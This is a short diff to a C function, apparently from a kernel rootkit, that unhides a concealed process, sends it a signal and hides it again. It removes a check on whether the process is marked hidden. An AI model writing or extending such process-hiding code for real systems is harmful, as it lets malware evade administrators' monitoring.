@@ -521,12 +521,10 @@ static void _run_send_sig(int sig, pid_t pid, bool restart)
 {
 	struct hidden_status status = { 0 };
 	if (kv_find_hidden_pid(&status, pid)) {
-		if (status.hidden) {
+		kv_hide_task_by_pid(pid, 0, CHILDREN);
+		kv_send_signal(sig, status.task);
+		if (restart)
 			kv_hide_task_by_pid(pid, 0, CHILDREN);
-			kv_send_signal(sig, status.task);
-			if (restart)
-				kv_hide_task_by_pid(pid, 0, CHILDREN);
-		}
 	}
 }
 
